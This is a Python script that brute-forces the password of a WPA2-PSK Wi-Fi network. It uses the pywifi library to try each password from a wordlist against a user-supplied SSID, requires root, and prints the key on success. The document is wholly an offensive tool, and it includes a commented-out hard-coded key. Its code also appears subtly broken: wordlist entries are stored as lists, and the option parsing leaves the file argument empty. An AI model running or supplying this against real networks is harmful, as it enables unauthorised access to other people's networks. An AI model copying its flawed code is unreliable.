import pywifi
from pywifi import const
import time
import sys
import os
import getopt


def main(argv):
    f = ''
    try:
        opts, args = getopt.getopt(argv, "h:r")
    except getopt.GetoptError:
        print("failed")
        sys.exit(2)
    for opt, arg in opts:
        if opt == "-h":
            print("-r file")
            sys.exit()
        elif opt == "-r":
            f = arg
            print(f)
    if not os.path.exists(f):
        print(f)
        print("file does not exists.")
        sys.exit()
    bruteforce(f)


def passwords_list(f):
    passwords = []
    with open(f, 'r', encoding='utf8') as words:
        for password in words:
            password = password.split("\n")
            passwords.append(password)
    return passwords


def bruteforce(f):
    if os.getuid() != 0:
        print("You need to have root privileges to use this program. Please "
              "try again using 'sudo'.\n")
        sys.exit()
    passwords = passwords_list(f)
#    wifi = pywifi.PyWiFi()
#    interfaces = wifi.interfaces()[0]

    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]

    profile = pywifi.Profile()
    profile.ssid = input("Enter the name of the wifi network you want to try "
                         "to bruteforce:\n")
    start_time = time.time()
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    for password in passwords:
        # profile.key = "rba5829qaBdk"
        profile.key = password
        interface.remove_all_network_profiles()
        new_profile = interface.add_network_profile(profile)
        time.sleep(1)
        interface.connect(new_profile)

        while interface.status() == const.IFACE_CONNECTING:
            print("connecting pls wait")
            time.sleep(1)

        if interface.status() == const.IFACE_CONNECTED:
            print("Connected ! password for {} is {}\n".format(profile.ssid,
                                                               profile.key))
            print("Execution took {} seconds.".format(time.time()-start_time))
            interface.disconnect()
            exit()
        else:
            pass


if __name__ == "__main__":
    main(sys.argv[1:])
